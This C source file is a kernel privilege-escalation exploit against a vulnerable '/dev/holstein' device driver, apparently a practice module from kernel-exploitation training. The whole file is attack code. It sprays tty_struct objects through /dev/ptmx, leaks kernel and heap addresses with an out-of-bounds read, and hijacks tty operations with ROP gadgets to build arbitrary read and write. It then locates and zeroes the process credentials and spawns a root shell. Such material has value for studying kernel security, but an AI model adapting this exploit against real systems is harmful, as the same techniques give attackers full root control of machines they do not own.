#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define spray_num 100
#define ofs_tty_ops 0xc38880
#define mov_ptr_rdx_rcx_ret (kbase + 0x1b7dd6)
#define mov_eax_ptr_rdx_ret (kbase + 0x440428)

u64 kbase;
u64 g_buf;
i32 cache_fd = -1;
int spray[spray_num];
char buf[0x500];
int global;

void open_kn() {
  global = open("/dev/holstein", O_RDWR);
  if (global < 0) {
    puts("[-] cuts");
    exit(-1);
  }
  puts("successfully opened");
}

void fatal(char *msg) {
  perror(msg);
  exit(-1);
}
void read_dev() {
  read(global, buf, 0x500);
  kbase = *(u64 *)&buf[0x418] - ofs_tty_ops;
  g_buf = *(u64 *)&buf[0x438] - 0x438;
  printf("gbuf: 0x%lx\n", g_buf);
  printf("leaked kbase: 0x%lx\n", kbase);
}
u32 AAR32(u64 addr) {
  if (cache_fd == -1) {
    unsigned long *p = (unsigned long *)&buf;
    p[12] = mov_eax_ptr_rdx_ret;
    *(u64 *)&buf[0x418] = g_buf;
    write(global, buf, 0x420);

    for (int i = 0; i < spray_num; i++) {
      int v = ioctl(spray[i], 0, addr /* rdx */);
      if (v != -1) {
        cache_fd = spray[i];
        return v;
      }
    }
  } else {
    return ioctl(cache_fd, 0, addr);
  }
  return -1;
}
void AAW32(u64 addr, u32 val) {
  printf("[*] AAW: writing 0x%x at 0x%lx\n", val, addr);
  u64 *p = (u64 *)&buf;
  p[0xc] = mov_ptr_rdx_rcx_ret;
  *(u64 *)&buf[0x418] = g_buf;
  write(global, buf, 0x420);

  for (int i = 0; i < spray_num; i++)
    ioctl(spray[i], val /* rcx */, addr /* rdx */);
}
int main() {
  printf("spraying tty_struct objects\n");
  for (int i = 0; i < spray_num / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      perror("cuts");
    }
  }
  open_kn();
  for (int i = spray_num / 2; i < spray_num; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      perror("cuts");
    }
  }
  read_dev();
  puts("changing comm to aptx4869");
  if (prctl(PR_SET_NAME, "aptx4869") != 0)
    fatal("prctl fail");
  u64 addr;
  for (addr = g_buf - 0x1000000;; addr += 0x8) {
    if ((addr & 0xfffff) == 0)
      printf("[*] searching for aptx4869 at 0x%lx\n", addr);

    if (AAR32(addr) == 0x78747061 && AAR32(addr + 4) == 0x39363834) {
      printf("[+] .comm found at 0x%lx\n", addr);
      break;
    }
  }
  u64 addr_cred = (((u64)AAR32(addr - 4)) << 32) | (u64)AAR32(addr - 8);
  printf("[+] current->cred = 0x%lx\n", addr_cred);
  puts("go go go root");
  for (int i = 1; i < 9; i++) {
    AAW32(addr_cred + i * 4, 0);
  }
  puts("spwaning root ^^");
  system("/bin/sh");
  close(global);
  for (int i = 0; i < spray_num; i++)
    close(spray[i]);

  return 0;
}
